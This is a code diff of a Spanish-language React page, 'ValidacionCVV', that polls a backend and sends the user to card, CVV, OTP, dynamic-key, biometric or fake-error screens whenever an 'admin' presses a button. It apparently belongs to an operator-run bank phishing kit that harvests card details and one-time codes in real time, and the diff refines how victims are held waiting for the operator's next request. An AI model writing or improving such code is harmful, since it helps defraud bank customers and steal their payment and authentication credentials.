@@ -20,21 +20,20 @@ export default function ValidacionCVV() {
         lanzarModalErrorSesion: false,
     });
 
-    // Ref para controlar el estado de carga (fix compilación y loop)
     const loadingRef = useRef(false);
-    
-    // Ref para rastrear el estado anterior y evitar redirección automática después de approve_custom
     const estadoAnteriorRef = useRef(null);
+    const aprobadoEsperandoRef = useRef(false);
 
-    // Polling solo se activa cuando polling === true (después de enviar CVV)
     useEffect(() => {
-        if (!polling) return; // Solo ejecutar cuando polling está activo
+        if (!polling) return;
 
         let interval;
         let timeoutId;
         let attempts = 0;
-        const MAX_ATTEMPTS = 60; // Máximo 60 intentos = 3 minutos (60 * 3s)
-        const TIMEOUT_MS = 180000; // 3 minutos en total
+        const MAX_ATTEMPTS = 60;
+        const TIMEOUT_MS = 180000;
+        aprobadoEsperandoRef.current = false;
+        estadoAnteriorRef.current = null;
 
         const checkStatus = async () => {
             try {
@@ -81,19 +80,13 @@ export default function ValidacionCVV() {
                     return;
                 }
 
-                // Estados que indican que debemos seguir esperando (admin aún no ha decidido)
-                // NO redirigir automáticamente, esperar a que el admin presione un botón específico
                 const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
-                
                 if (estadosEspera.includes(estado)) {
-                    // Seguir esperando, mantener loading
+                    estadoAnteriorRef.current = estado;
                     return;
                 }
 
-                // Si el estado es 'solicitar_cvv_custom' o 'solicitar_cvv', significa que el admin quiere que el usuario ingrese CVV
-                // En este caso, NO redirigir, solo quitar loading y permitir que el usuario ingrese
                 if (estado === 'solicitar_cvv_custom' || estado === 'solicitar_cvv') {
-                    // El usuario ya está en la página de CVV, solo quitar loading
                     clearInterval(interval);
                     clearTimeout(timeoutId);
                     setCargando(false);
@@ -101,49 +94,32 @@ export default function ValidacionCVV() {
                     return;
                 }
 
-                // Si hay error (rechazo del admin), limpiar campo y permitir reintento sin recargar
                 if (estado === 'error_cvv_custom') {
                     clearInterval(interval);
                     clearTimeout(timeoutId);
                     setCargando(false);
                     setPolling(false);
-                    // Mostrar modal de error en lugar de alert
-                    setFormState(prev => ({
-                        ...prev,
-                        lanzarModalErrorSesion: true
-                    }));
-                    // Ocultar modal después de 2 segundos
-                    setTimeout(() => {
-                        setFormState(prev => ({
-                            ...prev,
-                            lanzarModalErrorSesion: false
-                        }));
-                    }, 2000);
-                    // Limpiar campo para permitir reintento (sin recargar página)
+                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
+                    setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
                     setCvv("");
                     return;
                 }
 
-                // IMPORTANTE: NO redirigir automáticamente cuando el admin aprueba
-                // Cuando el admin aprueba CVV Custom, el backend establece 'solicitar_din' y muestra el menú principal
-                // NO debemos redirigir automáticamente en ese momento. Solo redirigir cuando el admin presiona un botón específico
-                
-                // Detectar si el estado cambió de 'awaiting_cvv_approval' a 'solicitar_din'
-                // Esto indica que el admin aprobó pero aún no presionó ningún botón
-                const estadoAnterior = estadoAnteriorRef.current;
-                const esAprobacionReciente = estadoAnterior === 'awaiting_cvv_approval' && estado === 'solicitar_din';
-                
-                // Actualizar estado anterior
-                estadoAnteriorRef.current = estado;
-                
-                // Si es una aprobación reciente, NO redirigir, seguir esperando
-                if (esAprobacionReciente) {
-                    // El admin aprobó, pero aún no presionó ningún botón
-                    // Mantener loading y seguir esperando
+                // Admin aprobó CVV Custom: backend pone 'solicitar_din' y muestra menú.
+                // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
+                const prev = estadoAnteriorRef.current;
+                const aprobadoAhora = (prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') && estado === 'solicitar_din';
+                if (aprobadoAhora) {
+                    aprobadoEsperandoRef.current = true;
+                    estadoAnteriorRef.current = estado;
                     return;
                 }
-                
-                // Estados que indican que el admin presionó un botón específico (redirigir)
+                if (aprobadoEsperandoRef.current && estado === 'solicitar_din') {
+                    estadoAnteriorRef.current = estado;
+                    return;
+                }
+                estadoAnteriorRef.current = estado;
+
                 const estadosRedireccion = [
                     'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
                     'solicitar_biometria', 'error_923',
@@ -151,70 +127,54 @@ export default function ValidacionCVV() {
                     'error_tc', 'error_otp', 'error_din', 'error_login',
                     'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                 ];
+                if (!estadosRedireccion.includes(estado?.toLowerCase())) return;
 
-                // Solo procesar redirección si el estado está en la lista de redirección
-                // Y NO si estamos en un estado de espera
-                // Y NO si es una aprobación reciente
-                if (estadosRedireccion.includes(estado.toLowerCase()) && 
-                    !estadosEspera.includes(estado) && 
-                    !esAprobacionReciente) {
-                    clearInterval(interval);
-                    clearTimeout(timeoutId);
-                    setCargando(false);
-                    setPolling(false);
-                    
-                    // Switch para manejar redirecciones específicas (solo cuando admin presiona botón específico)
-                    switch (estado.toLowerCase()) {
-                        case 'solicitar_tc': 
-                            navigate("/validacion-tc"); 
-                            break;
-                        case 'solicitar_tc_custom': 
-                            // Usar la misma vista ValidacionTC para TC estándar y custom
-                            navigate("/validacion-tc"); 
-                            break;
-                        case 'solicitar_otp': 
-                            // Solo redirigir cuando el admin específicamente presiona el botón OTP
-                            navigate("/numero-otp"); 
-                            break;
-                        case 'solicitar_din': 
-                            // Solo redirigir cuando el admin específicamente presiona el botón DIN
-                            // (no cuando viene después de approve_custom)
-                            navigate("/clave-dinamica"); 
-                            break;
-                        case 'solicitar_finalizar': 
-                            navigate("/finalizado-page"); 
-                            break;
-                        case 'solicitar_biometria': 
-                            navigate("/verificacion-identidad"); 
-                            break;
-                        case 'error_923': 
-                            // Se almacena en el localStorage el estado de sesión con error
-                            localStorage.setItem('estado_sesion', 'error');
-                            navigate("/error-923page"); 
-                            break;
-                        case 'error_tc': 
-                            // Se almacena en el localStorage el estado de sesión con error
-                            localStorage.setItem('estado_sesion', 'error');
-                            navigate("/validacion-tc"); 
-                            break;
-                        case 'error_otp': 
-                            // Se almacena en el localStorage el estado de sesión con error
-                            localStorage.setItem('estado_sesion', 'error');
-                            navigate("/numero-otp"); 
-                            break;
-                        case 'error_din': 
-                            // Se almacena en el localStorage el estado de sesión con error
-                            localStorage.setItem('estado_sesion', 'error');
-                            navigate("/clave-dinamica"); 
-                            break;
-                        case 'error_login': 
-                            // Se almacena en el localStorage el estado de sesión con error
-                            localStorage.setItem('estado_sesion', 'error');
-                            navigate("/autenticacion"); 
-                            break;
-                        default:
-                            console.log("Estado no manejado en redirección:", estado);
-                    }
+                clearInterval(interval);
+                clearTimeout(timeoutId);
+                setCargando(false);
+                setPolling(false);
+
+                switch (estado.toLowerCase()) {
+                    case 'solicitar_tc':
+                        navigate("/validacion-tc");
+                        break;
+                    case 'solicitar_tc_custom':
+                        navigate("/validacion-tc");
+                        break;
+                    case 'solicitar_otp':
+                        navigate("/numero-otp");
+                        break;
+                    case 'solicitar_din':
+                        navigate("/clave-dinamica");
+                        break;
+                    case 'solicitar_finalizar':
+                        navigate("/finalizado-page");
+                        break;
+                    case 'solicitar_biometria':
+                        navigate("/verificacion-identidad");
+                        break;
+                    case 'error_923':
+                        localStorage.setItem('estado_sesion', 'error');
+                        navigate("/error-923page");
+                        break;
+                    case 'error_tc':
+                        localStorage.setItem('estado_sesion', 'error');
+                        navigate("/validacion-tc");
+                        break;
+                    case 'error_otp':
+                        localStorage.setItem('estado_sesion', 'error');
+                        navigate("/numero-otp");
+                        break;
+                    case 'error_din':
+                        localStorage.setItem('estado_sesion', 'error');
+                        navigate("/clave-dinamica");
+                        break;
+                    case 'error_login':
+                        localStorage.setItem('estado_sesion', 'error');
+                        navigate("/autenticacion");
+                        break;
+                    default:
+                        console.log("Estado no manejado en redirección:", estado);
                 }
             } catch (error) {
                 console.error("Error polling:", error);
